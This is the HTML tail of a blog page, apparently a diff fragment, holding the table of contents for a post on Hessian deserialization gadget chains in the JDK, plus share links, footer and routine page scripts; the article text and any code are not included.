+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hessian-Only-JDK"><span class="toc-number">1.</span> <span class="toc-text">Hessian Only JDK</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Principle"><span class="toc-number">1.2.</span> <span class="toc-text">Basic Principle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget-Chains"><span class="toc-number">1.3.</span> <span class="toc-text">Gadget Chains</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MultiUIDefaults"><span class="toc-number">1.3.1.</span> <span class="toc-text">MultiUIDefaults</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MimeTypeParameterList-MethodUtil"><span class="toc-number">1.3.2.</span> <span class="toc-text">MimeTypeParameterList + MethodUtil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe"><span class="toc-number">1.3.3.</span> <span class="toc-text">Unsafe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI"><span class="toc-number">1.3.4.</span> <span class="toc-text">JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PKCS9Attributes-BCEL"><span class="toc-number">1.3.5.</span> <span class="toc-text">PKCS9Attributes + BCEL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ProxyLazyValue-DumpBytecode-System-load"><span class="toc-number">1.3.6.</span> <span class="toc-text">ProxyLazyValue + DumpBytecode + System.load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSLT-Transform"><span class="toc-number">1.3.7.</span> <span class="toc-text">XSLT Transform</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.4.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/17/Hessian-Only-JDK/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/17/Hessian-Only-JDK/&text=Hessian Only JDK"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/17/Hessian-Only-JDK/&is_video=false&description=Hessian Only JDK"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Hessian Only JDK&body=Check out this article: http://example.com/2023/11/17/Hessian-Only-JDK/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/17/Hessian-Only-JDK/&title=Hessian Only JDK"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/17/Hessian-Only-JDK/&name=Hessian Only JDK&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/17/Hessian-Only-JDK/&t=Hessian Only JDK"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    P3ngu1nW
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
